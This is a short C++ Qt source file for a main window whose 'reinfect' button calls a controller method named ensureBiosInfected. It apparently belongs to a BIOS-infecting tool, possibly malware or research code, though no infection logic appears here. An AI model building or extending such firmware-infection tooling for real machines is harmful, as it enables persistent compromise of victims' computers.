#include "controller/view/impl/qt/MainWindow.hpp"
#include "ui_mainwindow.h"

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent)
  ,
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
}


void MainWindow::setController(IController * pController) {
    this->pController = pController;
}
void MainWindow::init(QPushButton * pReinfectPushButton) {
    QObject::connect(pReinfectPushButton, SIGNAL (released()), this, SLOT (handleButton()));
}

void MainWindow::handleButton() {
    this->pController->ensureBiosInfected();
}

MainWindow::~MainWindow()
{
    delete ui;
}
